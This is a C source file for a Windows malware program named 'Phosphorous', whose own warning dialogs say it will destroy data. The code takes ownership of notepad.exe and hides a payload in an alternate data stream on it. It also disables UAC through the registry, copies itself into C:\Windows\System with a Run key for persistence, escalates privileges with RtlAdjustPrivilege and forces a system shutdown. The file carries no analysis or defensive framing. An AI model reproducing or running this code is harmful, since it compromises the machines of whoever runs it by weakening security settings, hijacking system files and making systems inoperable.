#include "ads.h"
#include <TlHelp32.h>
const static BYTE mainfile[] = "btw fuck you chris";
LPCWSTR streamedFile = L"C:\\Windows\\notepad.exe";
LPCWSTR phosphorStream = L"phosphorousS";


typedef NTSTATUS(*RtlAdjustPrivilegeDef) (ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

VOID ShutdownSystem() {
	DWORD dwPrev;
	InitiateShutdownW(NULL, L"Phosphorous", 0, SHUTDOWN_FORCE_SELF | SHUTDOWN_FORCE_OTHERS | SHUTDOWN_GRACE_OVERRIDE | SHUTDOWN_POWEROFF, SHTDN_REASON_MAJOR_OPERATINGSYSTEM);
}

VOID DropMainExecutable() {
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
	DWORD dwA;
	WriteConsoleW(hOut, L"Entered DropMainExecutable()\n", 29, &dwA, NULL);
	
	LPPROCESS_INFORMATION lpPI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PROCESS_INFORMATION));
	LPPROCESS_INFORMATION lpPI2 = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PROCESS_INFORMATION));
	LPSTARTUPINFOW lpSI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(STARTUPINFOW));
	lpSI->cb = sizeof(STARTUPINFOW);
	WriteConsoleW(hOut, L"Takeown running synchronously\n", 30, &dwA, NULL);
	CreateProcessW(L"C:\\Windows\\System32\\takeown.exe", L"C:\\Windows\\System32\\takeown.exe -f C:\\Windows\\notepad.exe", NULL, NULL, 0, 0, NULL, NULL, lpSI, lpPI);
	DWORD dwExit = STILL_ACTIVE;
	while (dwExit == STILL_ACTIVE) dwA = GetExitCodeProcess(lpPI->hProcess, &dwExit);
	WriteConsoleW(hOut, L"Icacls running synchronously\n", 29, &dwA, NULL);
	CreateProcessW(L"C:\\Windows\\System32\\icacls.exe", L"C:\\Windows\\System32\\icacls.exe C:\\Windows\\notepad.exe /grant USERS:f", NULL, NULL, 0, 0, NULL, NULL, lpSI, lpPI2);
	dwExit = STILL_ACTIVE;
	while (dwExit == STILL_ACTIVE) dwA = GetExitCodeProcess(lpPI2->hProcess, &dwExit);
	LPWSTR lpCode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);
	HANDLE hFile = PdpTouchADS(phosphorStream, streamedFile);
	dwA = GetLastError();
	wsprintfW(lpCode, L"Handle returned: 0x%08X, Lasterror: 0x%08X\n", hFile, dwA);
	WriteConsoleW(hOut, lpCode, lstrlenW(lpCode), &dwA, NULL);
	WriteFile(hFile, mainfile, sizeof(mainfile), &dwA, NULL);
}

BOOLEAN isFirstRun() {
	HKEY hKey;
	RegOpenKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\Phosphorous", &hKey);
	//RegDeleteKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\Phosphorous");
	RegCloseKey(hKey); 
	return hKey == NULL;
}

VOID AddTaskRunOnStartup(LPCWSTR lpName, LPCWSTR lpPath) {
	//C:\\Windows\\System32\\schtasks.exe /create /sc ONSTART /tn {{{VARIABLE}}} /tr {{{VARIABLE}}} /ru System
	LPCWSTR lpCommand = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);
	lstrcatW(lpCommand, L"C:\\Windows\\System32\\schtasks.exe /create /sc ONSTART /tn ");
	lstrcatW(lpCommand, lpName);
	lstrcatW(lpCommand, L" /tr");
	lstrcatW(lpCommand, lpPath);
	lstrcatW(lpCommand, L" /ru System");
	LPPROCESS_INFORMATION lpProcessInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PROCESS_INFORMATION));
	LPSTARTUPINFOW lpStartupInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(STARTUPINFOW));
	lpStartupInfo->cb = sizeof(STARTUPINFOW);
	CreateProcessW(L"C:\\Windows\\System32\\schtasks.exe", lpCommand, NULL, NULL, 0, 0, NULL, NULL, lpStartupInfo, lpProcessInfo);
}

VOID MakeRunOnStartup() {
	WCHAR lpPath[MAX_PATH];
	HANDLE hFile, hNewFile;
	DWORD dwLength, dwMainExecBase, dwMainExecLen = sizeof(mainfile);
	LPBYTE lpBuffer, lpConstStatic = 0; 

	PIMAGE_DOS_HEADER lpDosHeader = GetModuleHandle(NULL);
	PIMAGE_NT_HEADERS lpNtHeaders = (DWORD)lpDosHeader + (DWORD)lpDosHeader->e_lfanew;
	

	GetModuleFileNameW(NULL, lpPath, MAX_PATH);
	hFile = CreateFileW(lpPath, FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	dwLength = GetFileSize(hFile, NULL);
	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
	ReadFile(hFile, lpBuffer, dwLength, &dwLength, NULL);
	//dwMainExecBase = lpNtHeaders->OptionalHeader.BaseOfData + (DWORD)mainfile - (DWORD)GetModuleHandle(NULL);[	
	CloseHandle(hFile);
	LPDWORD lpSearcher = lpBuffer + 64;
	//lpConstStatic = (LPBYTE)((DWORD)lpBuffer + dwMainExecBase);
	goto tmpfx;
	//FIND ME IF YOU CAN
	for (DWORD dwSearcherOffset = 0; dwSearcherOffset < lpNtHeaders->OptionalHeader.BaseOfData; dwSearcherOffset++)
		if (*(LPDWORD)((DWORD)lpSearcher + dwSearcherOffset) == 0x00905A4D) { lpConstStatic = (DWORD)lpSearcher + dwSearcherOffset; break; }//fucking little endian
	if (!lpConstStatic) ShutdownSystem();
	for (DWORD dwCurrentAddress = 0; dwCurrentAddress < dwMainExecLen; dwCurrentAddress++) 
		lpConstStatic[dwCurrentAddress] = 0; 
	for (DWORD dwCurrentAddress = 0; dwCurrentAddress < lstrlenW(lpPath); dwCurrentAddress++)
		lpConstStatic[dwCurrentAddress] = ((BYTE*)lpPath)[dwCurrentAddress];
	tmpfx:
	

	hNewFile = CreateFileW(L"C:\\Windows\\System\\starsign.exe", FILE_GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
	if (hNewFile == INVALID_HANDLE_VALUE) {
		MessageBoxW(GetDesktopWindow(), L"Failed to drop. Unable to create launcher destination file for write. Insufficient privileges ? File exists ? Exitting", L"Failed", MB_ICONERROR);
		ShutdownSystem();
	}
	WriteFile(hNewFile, lpBuffer, dwLength, &dwLength, NULL);
	CloseHandle(hNewFile);
	//PpdAddFileToStartup(L"Phosphorous", L"C:\\Windows\\System\\pl.exe");
	HANDLE hKey;
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegSetValueExW(hKey, L"Phossy", 0, REG_SZ, L"C:\\Windows\\System\\starsign.exe", 62);
	RegCloseKey(hKey);
}

VOID __inline firstRun() {
	HKEY hKey, hUACkey;
	DWORD dwFalse = 0,
	dwResponse = MessageBoxW(GetDesktopWindow(), L"WARNING! THIS PROGRAM IS MALICIOUS AND ABLE TO DESTROY DATA! CLICK \"YES\" TO RUN PHOSPHOROUS AND AGREE THAT THE AUTHOR OF THIS PROGRAM IS NOT RESPONSIBLE FOR ANY DAMAGE OR DATA LOSS CAUSED BY THIS PROGRAM!", L"Phosphorous", MB_YESNO | MB_ICONERROR);
  	if (dwResponse == IDNO) ExitProcess(0);
	dwResponse = MessageBoxW(GetDesktopWindow(), L"THIS IS THE FINAL WARNING. THIS PROGRAM MAY AND WILL DESTROY YOUR DATA WHEN RUN AND WILL MAKE THE SYSTEM INOPERABLE. YOU TAKE ANY RESPONSIBILITY FOR ANY AND ALL DAMAGE OR DATA LOSS BY CLICKING \"YES\"", L"Phosphorous", MB_YESNO | MB_ICONERROR);
  	if (dwResponse == IDNO) ExitProcess(0);
	MessageBoxW(GetDesktopWindow(), L"In that case, enjoy.", L"Phosphorous", MB_OK);
	DropMainExecutable();
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\Phosphorous", &hKey);
	RegCloseKey(hKey);
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hUACkey);
	RegSetValueExW(hUACkey, L"EnableLUA", 0, REG_DWORD, &dwFalse, sizeof(DWORD));
	MakeRunOnStartup();
	ShutdownSystem();
}

INT main() {
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	DWORD dwPrev;
	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilegeDef RtlAdjustPrivilege = (RtlAdjustPrivilegeDef)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	RtlAdjustPrivilege(19, 1, 0, &dwPrev);
	RtlAdjustPrivilege(17, 1, 0, &dwPrev);
	RtlAdjustPrivilege(16, 1, 0, &dwPrev);
#ifdef dbg
	DropMainExecutable();
#endif
	if (isFirstRun()) firstRun();
	//else DeleteFileW(mainfile); //Nikola Tesla - Biography of a True Genius
	PpdExecuteFileFromADS(phosphorStream, streamedFile);
}